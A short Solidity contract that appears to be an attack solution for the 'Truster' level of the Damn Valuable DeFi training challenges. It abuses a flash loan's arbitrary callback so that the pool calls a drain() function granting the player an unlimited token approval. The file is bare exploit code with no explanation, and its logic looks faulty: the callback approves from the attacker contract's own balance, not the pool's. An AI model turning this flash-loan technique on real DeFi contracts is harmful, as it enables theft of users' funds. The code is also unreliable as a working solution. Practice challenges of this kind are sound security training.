// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface ITrusterLenderPool{
    function flashLoan(uint256, address, address, bytes calldata) external;
}

contract Trustee{
    address public victim;
    DamnValuableToken public token;
    address public player;

    constructor(address _victim,address _token,address _player){
        victim = _victim;
        token = DamnValuableToken(_token);
        player = _player;
    }

    function attack() external {
        ITrusterLenderPool(victim).flashLoan(
            0,
            player,
            address(this),
            abi.encodeWithSignature("drain()")
        );
    }

    function drain() external {
        token.approve(player,type(uint256).max);
    }
}